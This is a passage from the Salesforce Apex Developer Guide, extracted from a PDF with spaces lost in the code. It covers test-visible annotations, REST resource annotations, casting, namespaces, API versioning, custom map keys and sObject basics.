With this annotation, you don’t have to change the access modifiers of your methods and member variables to public if you want to
access them in a test method. For example, if a private member variable isn’t supposed to be exposed to external classes but it must be
accessible by a test method, you can add the TestVisible annotation to the variable definition.
113
Classes, Objects, and InterfacesApex Developer Guide

This example shows how to annotate a private class member variable and private method with TestVisible.
publicclassTestVisibleExample{
// Privatemembervariable
@TestVisibleprivatestaticIntegerrecordNumber= 1;
// Privatemethod
@TestVisibleprivatestaticvoidupdateRecord(Stringname){
// Do something
}
}
This test class uses the previous class and contains the test method that accesses the annotated member variable and method.
@IsTest
privateclassTestVisibleExampleTest{
@IsTeststaticvoidtest1(){
// AccessprivatevariableannotatedwithTestVisible
Integeri = TestVisibleExample.recordNumber;
System.assertEquals(1,i);
// AccessprivatemethodannotatedwithTestVisible
TestVisibleExample.updateRecord('RecordName');
// Performsomeverification
}
}
Apex REST Annotations
Use these annotations to expose an Apex class as a RESTful Web service.
•
@ReadOnly
•
@RestResource(urlMapping='/yourUrl')
•
@HttpDelete
•
@HttpGet
•
@HttpPatch
•
@HttpPost
•
@HttpPut
SEE ALSO:
Exposing Apex Classes as REST Web Services
RestResource Annotation
The @RestResource annotation is used at the class level and enables you to expose an Apex class as a REST resource.
Some considerations when using this annotation:
•
The URL mapping is relative to https://instance.salesforce.com/services/apexrest/.
•
The URL mapping can contain a wildcard (*).
•
The URL mapping is case-sensitive. For example, a URL mapping for my_url matches a REST resource containing my_url and
not My_Url.
114
Classes, Objects, and InterfacesApex Developer Guide

•
To use this annotation, your Apex class must be defined as global.
URL Guidelines
URL path mappings are as follows:
•
The path must begin with a forward slash (/).
•
The path can be up to 255 characters long.
•
A wildcard (*) that appears in a path must be preceded by a forward slash (/). Additionally, unless the wildcard is the last character
in the path, it must be followed by a forward slash (/).
The rules for mapping URLs are:
•
An exact match always wins.
•
If no exact match is found, find all the patterns with wildcards that match, and then select the longest (by string length) of those.
•
If no wildcard match is found, an HTTP response status code 404 is returned.
The URL for a namespaced class contains the namespace. For example, if your class is in namespace abc and the class is mapped to
your_url, then the API URL is modified as follows:
https://instance.salesforce.com/services/apexrest/abc/your_url/. In the case of a URL collision, the
namespaced class is always used.
HttpDelete Annotation
The @HttpDelete annotation is used at the method level and enables you to expose an Apex method as a REST resource. This
method is called when an HTTP DELETE request is sent, and deletes the specified resource.
To use this annotation, your Apex method must be defined as global static.
HttpGet Annotation
The @HttpGet annotation is used at the method level and enables you to expose an Apex method as a REST resource. This method
is called when an HTTP GET request is sent, and returns the specified resource.
These are some considerations when using this annotation:
•
To use this annotation, your Apex method must be defined as global static.
•
Methods annotated with @HttpGet are also called if the HTTP request uses the HEAD request method.
HttpPatch Annotation
The @HttpPatch annotation is used at the method level and enables you to expose an Apex method as a REST resource. This method
is called when an HTTP PATCH request is sent, and updates the specified resource.
To use this annotation, your Apex method must be defined as global static.
HttpPost Annotation
The @HttpPost annotation is used at the method level and enables you to expose an Apex method as a REST resource. This method
is called when an HTTP POST request is sent, and creates a new resource.
To use this annotation, your Apex method must be defined as global static.
115
Classes, Objects, and InterfacesApex Developer Guide

HttpPut Annotation
The @HttpPut annotation is used at the method level and enables you to expose an Apex method as a REST resource. This method
is called when an HTTP PUT request is sent, and creates or updates the specified resource.
To use this annotation, your Apex method must be defined as global static.
Classes and Casting
In general, all type information is available at run time. This means that Apex enables casting, that is, a data type of one class can be
assigned to a data type of another class, but only if one class is a subclass of the other class. Use casting when you want to convert an
object from one data type to another.
In the following example, CustomReport extends the class Report. Therefore, it is a subclass of that class. This means that you
can use casting to assign objects with the parent data type (Report) to the objects of the subclass data type (CustomReport).
publicvirtualclassReport{
}
publicclassCustomReportextendsReport{
}
In the following code segment, a custom report object is first added to a list of report objects. Then the custom report object is returned
as a report object, which is then cast back into a custom report object.
...
// Createa listof reportobjects
Report[]Reports= new Report[5];
// Createa customreportobject
CustomReporta = new CustomReport();
// Becausethe customreportis a sub classof the Reportclass,
// you can add the customreportobjecta to the listof reportobjects
Reports.add(a);
// The followingis not legal:
// CustomReportc = Reports.get(0);
// becausethe compilerdoesnot knowthatwhatyou are
// returningis a customreport.
// You mustuse castto tellit thatyou knowwhat
// typeyou are returning.Instead,get the firstitemin the list
// by castingit backto a customreportobject
CustomReportc = (CustomReport)Reports.get(0);
...
116
Classes, Objects, and InterfacesApex Developer Guide

Casting Example
In addition, an interface type can be cast to a sub-interface or a class type that implements that interface.
Tip:  To verify if a class is a specific type of class, use the instanceOf keyword. For more information, see Using the
instanceof Keyword on page 85.
1.Classes and Collections
2.Collection Casting
Classes and Collections
Lists and maps can be used with classes and interfaces, in the same ways that lists and maps can be used with sObjects. This means, for
example, that you can use a user-defined data type for the value or the key of a map. Likewise, you can create a set of user-defined
objects.
If you create a map or list of interfaces, any child type of the interface can be put into that collection. For instance, if the List contains an
interface i1, and MyC implements i1, then MyC can be placed in the list.
SEE ALSO:
Using Custom Types in Map Keys and Sets
117
Classes, Objects, and InterfacesApex Developer Guide

Collection Casting
Because collections in Apex have a declared type at runtime, Apex allows collection casting.
Collections can be cast in a similar manner that arrays can be cast in Java. For example, a list of CustomerPurchaseOrder objects can be
assigned to a list of PurchaseOrder objects if class CustomerPurchaseOrder is a child of class PurchaseOrder.
publicvirtualclassPurchaseOrder{
PublicclassCustomerPurchaseOrderextendsPurchaseOrder{
}
{
List<PurchaseOrder>POs = new PurchaseOrder[]{};
List<CustomerPurchaseOrder>CPOs= new CustomerPurchaseOrder[]{};
POs = CPOs;
}
}
Once the CustomerPurchaseOrder list is assigned to the PurchaseOrder list variable, it can be cast back to a list of
CustomerPurchaseOrder objects, but only because that instance was originally instantiated as a list of CustomerPurchaseOrder objects.
A list of PurchaseOrder objects that is instantiated as such cannot be cast to a list of CustomerPurchaseOrder objects, even if the list of
PurchaseOrder objects contains only CustomerPurchaseOrder objects.
If the user of a PurchaseOrder list that only includes CustomerPurchaseOrders objects tries to insert a non-CustomerPurchaseOrder
subclass of PurchaseOrder (such as InternalPurchaseOrder), a runtime exception results. This is because Apex collections
have a declared type at runtime.
Note:  Maps behave in the same way as lists with regards to the value side of the Map. If the value side of map A can be cast to
the value side of map B, and they have the same key type, then map A can be cast to map B. A runtime error results if the casting
is not valid with the particular map at runtime.
Differences Between Apex Classes and Java Classes
Apex classes and Java classes work in similar ways, but there are some significant differences.
These are the major differences between Apex classes and Java classes:
•
Inner classes and interfaces can only be declared one level deep inside an outer class.
•
Static methods and variables can only be declared in a top-level class definition, not in an inner class.
•
An inner class behaves like a static Java inner class, but doesn’t require the static keyword. An inner class can have instance
member variables like an outer class, but there is no implicit pointer to an instance of the outer class (using the this keyword).
•
The private access modifier is the default, and means that the method or variable is accessible only within the Apex class in
which it is defined. If you do not specify an access modifier, the method or variable is private.
•
Specifying no access modifier for a method or variable and the private access modifier are synonymous.
•
The public access modifier means the method or variable can be used by any Apex in this application or namespace.
•
The global access modifier means the method or variable can be used by any Apex code that has access to the class, not just
the Apex code in the same application. This access modifier should be used for any method that needs to be referenced outside of
the application, either in the SOAP API or by other Apex code. If you declare a method or variable as global, you must also declare
the class that contains it as global.
•
Methods and classes are final by default.
–
The virtual definition modifier allows extension and overrides.
118
Classes, Objects, and InterfacesApex Developer Guide

–
The override keyword must be used explicitly on methods that override base class methods.
•
Methods defined in an interface have the same access modifier (public or global) as the interface.
•
Exception classes must extend either exception or another user-defined exception.
–
Their names must end with the word exception.
–
Exception classes have four implicit constructors that are built-in, although you can add others.
•
Classes and interfaces can be defined in triggers and anonymous blocks, but only as local.
SEE ALSO:
Exceptions in Apex
Class Definition Creation
Use the class editor to create a class in Salesforce.
1.From Setup, enter ApexClasses in the QuickFind box, then select Apex Classes.
2.Click New.
3.Click Version Settings to specify the version of Apex and the API used with this class. If your organization has installed managed
packages from the AppExchange, you can also specify which version of each managed package to use with this class. Use the default
values for all versions. This associates the class with the most recent version of Apex and the API, as well as each managed package.
You can specify an older version of a managed package if you want to access components or functionality that differs from the most
recent package version. You can specify an older version of Apex and the API to maintain specific behavior.
4.In the class editor, enter the Apex code for the class. A single class can be up to 1 million characters in length, not including comments,
test methods, or classes defined using @IsTest.
5.Click Save to save your changes and return to the class detail screen, or click Quick Save to save your changes and continue editing
your class. Your Apex class must compile correctly before you can save your class.
Classes can also be automatically generated from a WSDL by clicking Generate from WSDL. See SOAP Services: Defining a Class from
a WSDL Document on page 603.
Once saved, classes can be invoked through class methods or variables by other Apex code, such as a trigger.
Note:  To aid backwards-compatibility, classes are stored with the version settings for a specified version of Apex and the API. If
the Apex class references components, such as a custom object, in installed managed packages, the version settings for each
managed package referenced by the class is saved too. Additionally, classes are stored with an isValid flag that is set to true
as long as dependent metadata hasn’t changed since the class was last compiled. If any changes are made to object names or
fields that are used in the class, including superficial changes such as edits to an object or field description, or if changes are made
to a class that calls this class, the isValid flag is set to false. When a trigger or Web service call invokes the class, the code
is recompiled and the user is notified if there are any errors. If there are no errors, the isValid flag is reset to true.
The Apex Class Editor
The Apex and Visualforce editor has the following functionality:
Syntax highlighting
The editor automatically applies syntax highlighting for keywords and all functions and operators.
Search ()
Search enables you to search for text within the current page, class, or trigger. To use search, enter a string in the Search textbox
and click Find Next.
119
Classes, Objects, and InterfacesApex Developer Guide

•
To replace a found search string with another string, enter the new string in the Replace textbox and click replace to replace
just that instance, or Replace All to replace that instance and all other instances of the search string that occur in the page, class,
or trigger.
•
To make the search operation case sensitive, select the Match Case option.
•
To use a regular expression as your search string, select the Regular Expressions option. The regular expressions follow
JavaScript's regular expression rules. A search using regular expressions can find strings that wrap over more than one line.
If you use the replace operation with a string found by a regular expression, the replace operation can also bind regular expression
group variables ($1, $2, and so on) from the found search string. For example, to replace an <h1> tag with an <h2> tag and
keep all the attributes on the original <h1> intact, search for <h1(\s+)(.*)> and replace it with <h2$1$2>.
Go to line ()
This button allows you to highlight a specified line number. If the line isn’t currently visible, the editor scrolls to that line.
Undo () and Redo ()
Use undo to reverse an editing action and redo to recreate an editing action that was undone.
Font size
Select a font size from the dropdown list to control the size of the characters displayed in the editor.
Line and column position
The line and column position of the cursor is displayed in the status bar at the bottom of the editor. This can be used with go to line
() to quickly navigate through the editor.
Line and character count
The total number of lines and characters is displayed in the status bar at the bottom of the editor.
1.Naming Conventions
2.Name Shadowing
Naming Conventions
We recommend following Java standards for naming, that is, classes start with a capital letter, methods start with a lowercase verb, and
variable names should be meaningful.
It is not legal to define a class and interface with the same name in the same class. It is also not legal for an inner class to have the same
name as its outer class. However, methods and variables have their own namespaces within the class so these three types of names do
not clash with each other. In particular it is legal for a variable, method, and a class within a class to have the same name.
SEE ALSO:
Variables
Name Shadowing
Member variables can be shadowed by local variables—in particular function arguments. This allows methods and constructors of the
standard Java form:
PublicClassShadow{
Strings;
Shadow(Strings) { this.s = s; } // Samenameok
setS(Strings) { this.s = s; } // Samenameok
}
120
Classes, Objects, and InterfacesApex Developer Guide

Member variables in one class can shadow member variables with the same name in a parent classes. This can be useful if the two classes
are in different top-level classes and written by different teams. For example, if one has a reference to a class C and wants to gain access
to a member variable M in parent class P (with the same name as a member variable in C) the reference should be assigned to a reference
to P first.
Static variables can be shadowed across the class hierarchy—so if P defines a static S, a subclass C can also declare a static S. References
to S inside C refer to that static—in order to reference the one in P, the syntax P.S must be used.
Static class variables cannot be referenced through a class instance. They must be referenced using the raw variable name by itself (inside
that top-level class file) or prefixed with the class name. For example:
publicclassp1 {
publicstaticfinalIntegerCLASS_INT= 1;
publicclassc { };
}
p1.cc = new p1.c();
// Thisis illegal
// Integeri = c.CLASS_INT;
// Thisis correct
Integeri = p1.CLASS_INT;
Namespace Prefix
The Salesforce application supports the use of namespace prefixes. Namespace prefixes are used in managed AppExchange packages
to differentiate custom object and field names from names used by other organizations.
Important:  When creating a namespace, use something that’s useful and informative to users. However, don’t name a namespace
after a person (for example, by using a person's name, nickname, or private information). Once namespaces are assigned, they
cannot be changed.
After a developer registers a globally unique namespace prefix and registers it with AppExchange registry, external references to custom
object and field names in the developer's managed packages take on the following long format:
namespace_prefix__obj_or_field_name__c
These fully qualified names can be onerous to update in working SOQL or SOSL statements, and Apex once a class is marked as “managed”.
Therefore, Apex supports a default namespace for schema names. When looking at identifiers, the parser assumes that the namespace
of the current object is the namespace of all other objects and fields unless otherwise specified. Therefore, a stored class must refer to
custom object and field names directly (using obj_or_field_name__c) for those objects that are defined within its same
application namespace.
Tip:  Only use namespace prefixes when referring to custom objects and fields in managed packages that have been installed to
your organization from the AppExchange.
Using Namespaces When Invoking Package Methods
To invoke a method that is defined in a managed package, Apex allows fully qualified identifiers of the form:
namespace_prefix.class.method(args)
121
Classes, Objects, and InterfacesApex Developer Guide

Versioned Behavior Changes
In API version 34.0 and later, Schema.DescribeSObjectResult on a custom SObjectType includes map keys prefixed with the namespace,
even if the namespace is that of currently executing code. If you work with multiple namespaces and generate runtime describe data,
make sure that your code accesses keys correctly using the namespace prefix.
1.Using the System Namespace
2.Using the Schema Namespace
The Schema namespace provides classes and methods for working with schema metadata information. We implicitly import
Schema.*, but you must fully qualify your uses of Schema namespace elements when they have naming conflicts with items
in your unmanaged code. If your org contains an Apex class that has the same name as an sObject, add the Schema namespace
prefix to the sObject name in your code.
3.Namespace, Class, and Variable Name Precedence
4.Type Resolution and System Namespace for Types
Using the System Namespace
The System namespace is the default namespace in Apex. This means that you can omit the namespace when creating a new instance
of a system class or when calling a system method. For example, because the built-in URL class is in the System namespace, both of
these statements to create an instance of the URL class are equivalent:
System.URLurl1= new System.URL('https://MyDomainName.my.salesforce.com/');
And:
URL url1= new URL('https://MyDomainName.my.salesforce.com/');
Similarly, to call a static method on the URL class, you can write either of the following:
System.URL.getCurrentRequestUrl();
Or:
URL.getCurrentRequestUrl();
Note:  In addition to the System namespace, there is a built-in System class in the System namespace, which provides
methods like assertEquals and debug. Don’t get confused by the fact that both the namespace and the class have the
same name in this case. The System.debug('debugmessage'); and System.System.debug('debug
message'); statements are equivalent.
Using the System Namespace for Disambiguation
It is easier to not include the System namespace when calling static methods of system classes, but there are situations where you
must include the System namespace to differentiate the built-in Apex classes from custom Apex classes with the same name. If your
organization contains Apex classes that you’ve defined with the same name as a built-in class, the Apex runtime defaults to your custom
class and calls the methods in your class. Let’s take a look at the following example.
Create this custom Apex class:
publicclassDatabase{
publicstaticStringquery(){
return'whereforeart thounamespace?';
122
Classes, Objects, and InterfacesApex Developer Guide

}
}
Execute this statement in the Developer Console:
sObject[]acct= Database.query('SELECTNameFROMAccountLIMIT1');
System.debug(acct[0].get('Name'));
When the Database.query statement executes, Apex looks up the query method on the custom Database class first. However,
the query method in this class doesn’t take any parameters and no match is found, hence you get an error. The custom Database
class overrides the built-in Database class in the System namespace. To solve this problem, add the System namespace prefix
to the class name to explicitly instruct the Apex runtime to call the query method on the built-in Database class in the System
namespace:
sObject[]acct=System.Database.query('SELECTNameFROMAccountLIMIT1');
System.debug(acct[0].get('Name'));
SEE ALSO:
Using the Schema Namespace
Using the Schema Namespace
The Schema namespace provides classes and methods for working with schema metadata information. We implicitly import Schema.*,
but you must fully qualify your uses of Schema namespace elements when they have naming conflicts with items in your unmanaged
code. If your org contains an Apex class that has the same name as an sObject, add the Schema namespace prefix to the sObject name
in your code.
You can omit the namespace when creating an instance of a schema class or when calling a schema method. For example, because the
DescribeSObjectResult and FieldSet classes are in the Schema namespace, these code segments are equivalent.
Schema.DescribeSObjectResultd = Account.sObjectType.getDescribe();
Map<String, Schema.FieldSet>FSMap= d.fieldSets.getMap();
And:
DescribeSObjectResultd = Account.sObjectType.getDescribe();
Map<String, FieldSet>FSMap= d.fieldSets.getMap();
Using the Schema Namespace for Disambiguation
Use Schema.object_name to refer to an sObject that has the same name as a custom class. This disambiguation instructs the
Apex runtime to use the sObject.
publicclassAccount{
publicIntegermyInteger;
}
// ...
// Createa standardAccountobjectmyAccountSObject
Schema.AccountmyAccountSObject= new Schema.Account();
// CreateaccountClassInstance,a customclassin yourorg
AccountaccountClassInstance= new Account();
123
Classes, Objects, and InterfacesApex Developer Guide

myAccountSObject.Name= 'SnazzyAccount';
accountClassInstance.myInteger= 1;
SEE ALSO:
Using the System Namespace
Namespace, Class, and Variable Name Precedence
Because local variables, class names, and namespaces can all hypothetically use the same identifiers, the Apex parser evaluates expressions
in the form of name1.name2.[...].nameN as follows:
1.The parser first assumes that name1 is a local variable with name2 - nameN as field references.
2.If the first assumption does not hold true, the parser then assumes that name1 is a class name and name2 is a static variable name
with name3 - nameN as field references.
3.If the second assumption does not hold true, the parser then assumes that name1 is a namespace name, name2 is a class name,
name3 is a static variable name, and name4 - nameN are field references.
4.If the third assumption does not hold true, the parser reports an error.
If the expression ends with a set of parentheses (for example, name1.name2.[...].nameM.nameN()), the Apex parser evaluates
the expression as follows:
1.The parser first assumes that name1 is a local variable with name2 - nameM as field references, and nameN as a method
invocation.
2.If the first assumption does not hold true:
•
If the expression contains only two identifiers (name1.name2()), the parser then assumes that name1 is a class name and
name2 is a method invocation.
•
If the expression contains more than two identifiers, the parser then assumes that name1 is a class name, name2 is a static
variable name with name3 - nameM as field references, and nameN is a method invocation.
3.If the second assumption does not hold true, the parser then assumes that name1 is a namespace name, name2 is a class name,
name3 is a static variable name, name4 - nameM are field references, and nameN is a method invocation.
4.If the third assumption does not hold true, the parser reports an error.
However, with class variables Apex also uses dot notation to reference member variables. Those member variables might refer to other
class instances, or they might refer to an sObject which has its own dot notation rules to refer to field names (possibly navigating foreign
keys).
Once you enter an sObject field in the expression, the remainder of the expression stays within the sObject domain, that is, sObject fields
cannot refer back to Apex expressions.
For instance, if you have the following class:
publicclassc {
c1 c1 = new c1();
classc1 { c2 c2; }
classc2 { Accounta; }
}
Then the following expressions are all legal:
c.c1.c2.a.name
c.c1.c2.a.owner.lastName.toLowerCase()
124
Classes, Objects, and InterfacesApex Developer Guide

c.c1.c2.a.tasks
c.c1.c2.a.contacts.size()
Type Resolution and System Namespace for Types
Because the type system must resolve user-defined types defined locally or in other classes, the Apex parser evaluates types as follows:
1.For a type reference TypeN, the parser first looks up that type as a scalar type.
2.If TypeN is not found, the parser looks up locally defined types.
3.If TypeN still is not found, the parser looks up a class of that name.
4.If TypeN still is not found, the parser looks up system types such as sObjects.
For the type T1.T2 this could mean an inner type T2 in a top-level class T1, or it could mean a top-level class T2 in the namespace
T1 (in that order of precedence).
Apex Code Versions
To aid backwards-compatibility, classes and triggers are stored with the version settings for a specific Salesforce API version.
If an Apex class or trigger references components, such as a custom object, in installed managed packages, the version settings for each
managed package referenced by the class are saved too. This ensures that as Apex, the API, and the components in managed packages
evolve in subsequent released versions, a class or trigger is still bound to versions with specific, known behavior.
Setting a version for an installed package determines the exposed interface and behavior of any Apex code in the installed package. This
allows you to continue to reference Apex that may be deprecated in the latest version of an installed package, if you installed a version
of the package before the code was deprecated.
Typically, you reference the latest Salesforce API version and each installed package version. If you save an Apex class or trigger without
specifying the Salesforce API version, the class or trigger is associated with the latest installed version by default. If you save an Apex
class or trigger that references a managed package without specifying a version of the managed package, the class or trigger is associated
with the latest installed version of the managed package by default.
Versioning of Apex Classes and Methods
When classes and methods are added to the Apex language, those classes and methods are available to all API versions your Apex code
is saved with, regardless of the API version (Salesforce release) they were introduced in. For example, if a method was added in API
version 33.0, you can use this method in a custom class saved with API version 33.0 or another class saved with API version 25.0.
There is one exception to this rule. The classes and methods of the ConnectApi namespace are supported only in the API versions
specified in the documentation. For example, if a class or method is introduced in API version 33.0, it is not available in earlier versions.
For more information, see ConnectApi Versioning and Equality Checking on page 455.
1.Setting the Salesforce API Version for Classes and Triggers
2.Setting Package Versions for Apex Classes and Triggers
Setting the Salesforce API Version for Classes and Triggers
To set the Salesforce API and Apex version for a class or trigger:
1.Edit either a class or trigger, and click Version Settings.
2.Select the Version of the Salesforce API. This version is also the version of Apex associated with the class or trigger.
125
Classes, Objects, and InterfacesApex Developer Guide

3.Click Save.
If you pass an object as a parameter in a method call from one Apex class, C1, to another class, C2, and C2 has different fields exposed
due to the Salesforce API version setting, the fields in the objects are controlled by the version settings of C2.
In this example, the Categories field is set to null after calling the insertIdea method in class C2 from a method in the test
class C1, because the Categories field isn’t available in version 13.0 of the API.
The first class is saved using Salesforce API version 13.0:
// Thisclassis savedusingSalesforceAPI version13.0
// Version13.0doesnot includethe Idea.categoriesfield
globalclassC2
{
globalIdeainsertIdea(Ideaa) {
inserta; // categoryfieldset to nullon insert
// retrievethe new idea
IdeainsertedIdea= [SELECTtitleFROMIdeaWHEREId =:a.Id];
returninsertedIdea;
}
}
The following class is saved using Salesforce API version 16.0:
@IsTest
// Thisclassis boundto API version16.0by VersionSettings
privateclassC1
{
statictestMethodvoidtestC2Method(){
Ideai = new Idea();
i.CommunityId= '09aD000000004YCIAY';
i.Title= 'TestingVersionSettings';
i.Body= 'Categoriesfieldis includedin API version16.0';
i.Categories= 'test';
C2 c2 = new C2();
IdeareturnedIdea= c2.insertIdea(i);
// retrievethe new idea
IdeaideaMoreFields= [SELECTtitle,categoriesFROMIdea
WHEREId = :returnedIdea.Id];
// assertthatthe categoriesfieldfromthe objectcreated
// in thisclassis not null
System.assert(i.Categories!= null);
// assertthatthe categoriesfieldcreatedin C2 is null
System.assert(ideaMoreFields.Categories== null);
}
}
Setting Package Versions for Apex Classes and Triggers
To configure the package version settings for a class or trigger:
1.Edit either a class or trigger, and click Version Settings.
126
Classes, Objects, and InterfacesApex Developer Guide

2.Select a Version for each managed package referenced by the class or trigger. This version of the managed package will continue
to be used by the class or trigger if later versions of the managed package are installed, unless you manually update the version
setting. To add an installed managed package to the settings list, select a package from the list of available packages. The list is only
displayed if you have an installed managed package that is not already associated with the class or trigger.
3.Click Save.
Note the following when working with package version settings:
•
If you save an Apex class or trigger that references a managed package without specifying a version of the managed package, the
Apex class or trigger is associated with the latest installed version of the managed package by default.
•
You cannot Remove a class or trigger's version setting for a managed package if the package is referenced in the class or trigger.
Use Show Dependencies to find where a managed package is referenced by a class or trigger.
Lists of Custom Types and Sorting
Lists can hold objects of your user-defined types (your Apex classes). Lists of user-defined types can be sorted.
To sort such a list, your Apex class can implement the Comparator interface and pass it as a parameter to the List.sort method.
Alternatively, your Apex class can implement the Comparable interface.
The sort criteria and sort order depend on the implementation that you provide for the Comparable.compareTo or the
Comparator.compare method.
To perform locale-sensitive comparisons and sorting, use the Collator class. Because locale-sensitive sorting can produce different
results depending on the user running the code, avoid using it in triggers or in code that expects a particular sort order.
SEE ALSO:
Apex Reference Guide: Collator Class
Apex Reference Guide: Comparable Interface
Apex Reference Guide: Comparator Interface
Using Custom Types in Map Keys and Sets
You can add instances of your own Apex classes to maps and sets.
For maps, instances of your Apex classes can be added either as keys or values. If you add them as keys, there are some special rules that
your class must implement for the map to function correctly; that is, for the key to fetch the right value. Similarly, if set elements are
instances of your custom class, your class must follow those same rules.
Warning:  If the object in your map keys or set elements changes after being added to the collection, it won’t be found anymore
because of changed field values.
When using a custom type (your Apex class) for the map key or set elements, provide equals and hashCode methods in your
class. Apex uses these two methods to determine equality and uniqueness of keys for your objects.
Adding equals and hashCode Methods to Your Class
To ensure that map keys of your custom type are compared correctly and their uniqueness can be determined consistently, provide an
implementation of the following two methods in your class:
127
Classes, Objects, and InterfacesApex Developer Guide

•
The equals method with this signature:
publicBooleanequals(Objectobj){
// Yourimplementation
}
•
The hashCode method with this signature:
publicIntegerhashCode(){
// Yourimplementation
}
Sample
This sample shows how to implement the equals and hashCode methods. The class that provides those methods is listed first. It
also contains a constructor that takes two Integers. The second example is a code snippet that creates three objects of the class, two of
which have the same values. Next, map entries are added using the pair objects as keys. The sample verifies that the map has only two
entries since the entry that was added last has the same key as the first entry, and hence, overwrote it. The sample then uses the ==
operator, which works as expected because the class implements equals. Also, some additional map operations are performed, like
checking whether the map contains certain keys, and writing all keys and values to the debug log. Finally, the sample creates a set and
adds the same objects to it. It verifies that the set size is two, since only two objects out of the three are unique.
publicclassPairNumbers{
Integerx,y;
publicPairNumbers(Integera, Integerb) {
x=a;
y=b;
}
publicBooleanequals(Objectobj){
if (objinstanceofPairNumbers){
PairNumbersp = (PairNumbers)obj;
return((x==p.x)&& (y==p.y));
}
returnfalse;
}
publicIntegerhashCode(){
return(31 * x) ^ y;
}
}
This code snippet makes use of the PairNumbers class.
Map<PairNumbers,String> m = new Map<PairNumbers,String>();
PairNumbersp1 = new PairNumbers(1,2);
PairNumbersp2 = new PairNumbers(3,4);
// Duplicatekey
PairNumbersp3 = new PairNumbers(1,2);
m.put(p1,'first');
m.put(p2,'second');
m.put(p3,'third');
128
Classes, Objects, and InterfacesApex Developer Guide

// Map sizeis 2 becausethe entrywith
// the duplicatekey overwrotethe firstentry.
System.assertEquals(2,m.size());
// Use the == operator
if (p1 == p3) {
System.debug('p1 and p3 are equal.');
}
// Performsomeotheroperations
System.assertEquals(true, m.containsKey(p1));
System.assertEquals(true, m.containsKey(p2));
System.assertEquals(false, m.containsKey(new PairNumbers(5,6)));
for(PairNumberspn : m.keySet()){
System.debug('Key:' + pn);
}
List<String> mValues= m.values();
System.debug('m.values:' + mValues);
// Createa set
Set<PairNumbers>s1 = new Set<PairNumbers>();
s1.add(p1);
s1.add(p2);
s1.add(p3);
// Verifythatwe haveonlytwo elements
// sincethe p3 is equalto p1.
System.assertEquals(2,s1.size());
Working with Data in Apex
You can add and interact with data in the Lightning Platform persistence layer. The sObject data type is the main data type that holds
data objects. You’ll use Data Manipulation Language (DML) to work with data, and use query languages to retrieve data, such as the (),
among other things.
Working with sObjects
In this developer guide, the term sObject refers to any object that can be stored in the Lightning platform database.
Data Manipulation Language
Apex enables you to insert, update, delete or restore data in the database. DML operations allow you to modify records one at a time
or in batches.
SOQL and SOSL Queries
You can evaluate Salesforce Object Query Language (SOQL) or Salesforce Object Search Language (SOSL) statements on-the-fly in
Apex by surrounding the statement in square brackets.
SOQL For Loops
SOQL for loops iterate over all of the sObject records returned by a SOQL query.
sObject Collections
You can manage sObjects in lists, sets, and maps.
129
Working with Data in ApexApex Developer Guide

Dynamic Apex
Apex Security and Sharing
When you use Apex, the security of your code is critical. You'll need to add user permissions for Apex classes and enforce sharing
rules. Read on to learn about Apex managed sharing and get some security tips.
Custom Settings
Custom settings are similar to custom objects. Application developers can create custom sets of data and associate custom data for
an organization, profile, or specific user. All custom settings data is exposed in the application cache, which enables efficient access
without the cost of repeated queries to the database. Formula fields, validation rules, flows, Apex, and SOAP API can then use this
data.
Working with sObjects
In this developer guide, the term sObject refers to any object that can be stored in the Lightning platform database.
sObject Types
An sObject variable represents a row of data and can only be declared in Apex using SOAP API name of the object.
Accessing SObject Fields
Validating sObjects and Fields
sObject Types
An sObject variable represents a row of data and can only be declared in Apex using SOAP API name of the object.
For example:
Accounta = new Account();
MyCustomObject__cco = new MyCustomObject__c();
Similar to SOAP API, Apex allows the use of the generic sObject abstract type to represent any object. The sObject data type can be used
in code that processes different types of sObjects.
The new operator still requires a concrete sObject type, so all instances are specific sObjects. For example:
sObjects = new Account();
You can also use casting between the generic sObject type and the specific sObject type. For example:
// Castthe genericvariables fromthe exampleabove
// intoa specificaccountand accountvariablea
Accounta = (Account)s;
// The followinggeneratesa runtimeerror
Contactc = (Contact)s;
Because sObjects work like objects, you can also have the following:
Objectobj = s;
// and
a = (Account)obj;
DML operations work on variables declared as the generic sObject data type as well as with regular sObjects.
130
Working with Data in ApexApex Developer Guide

sObject variables are initialized to null, but can be assigned a valid object reference with the new operator. For example:
Accounta = new Account();
Developers can also specify initial field values with comma-separated name= value pairs when instantiating a new sObject. For
example:
Accounta = new Account(name= 'Acme', billingcity= 'SanFrancisco');
For information on accessing existing sObjects from the Lightning Platform database, see “SOQL and SOSL Queries” in the SOQL and
SOSL Reference.
Note:  The Lightning Platform assigns ID values automatically when an object record is initially inserted to the database for the
first time. For more information see Lists on page 28.
Custom Labels
Custom labels aren’t standard sObjects. You can’t create a new instance of a custom label. You can only access the value of a custom
label using system.label.label_name. For example:
StringerrorMsg= System.Label.generic_error;
For more information on custom labels, see “Custom Labels” in Salesforce Help.
Accessing SObject Fields
As in Java, SObject fields can be accessed or changed with simple dot notation. For example:
Accounta = new Account();
a.Name= 'Acme';// Accessthe accountnamefieldand assignit 'Acme'
System-generated fields, such as CreatedBy or LastModifiedDate, cannot be modified. If you try, the Apex runtime
engine generates an error. Additionally, formula field values and values for other fields that are read-only for the context user cannot be
changed.
If you use the generic SObject type instead of a specific object, such as Account, you can retrieve only the Id field using dot notation.
You can set the Id field for Apex code saved using Salesforce API version 27.0 and later). Alternatively, you can use the generic SObject
put and get methods. See SObject Class.
This example shows how you can access the Id field and operations that aren’t allowed on generic SObjects.
Accounta = new Account(Name= 'Acme',BillingCity= 'SanFrancisco');
inserta;
sObjects = [SELECTId, NameFROMAccountWHEREName= 'Acme'LIMIT1];
// Thisis allowed
ID id = s.Id;
// The followinglineresultsin an errorwhenyou try to save
Stringx = s.Name;
// Thislineresultsin an errorwhenyou try to saveusingAPI version26.0or earlier
s.Id= [SELECTId FROMAccountWHEREName= 'Acme'LIMIT1].Id;
Note:  If your organization has enabled person accounts, you have two different kinds of accounts: business accounts and person
accounts. If your code creates a new account using name, a business account is created. If your code uses LastName, a person
account is created.
131
Working with Data in ApexApex Developer Guide

If you want to perform operations on an SObject, it is recommended that you first convert it into a specific object. For example:
Accounta = new Account(Name= 'Acme', BillingCity= 'SanFrancisco');
inserta;
sObjects = [SELECTId, NameFROMAccountWHEREName= 'Acme'LIMIT1];
ID id = s.ID;
AccountconvertedAccount= (Account)s;
convertedAccount.name= 'Acme2';
updateconvertedAccount;
Contactsal = new Contact(FirstName= 'Sal', Account= convertedAccount);
The following example shows how you can use SOSL over a set of records to determine their object types. Once you have converted
the generic SObject record into a Contact, Lead, or Account, you can modify its fields accordingly:
publicclassconvertToCLA{
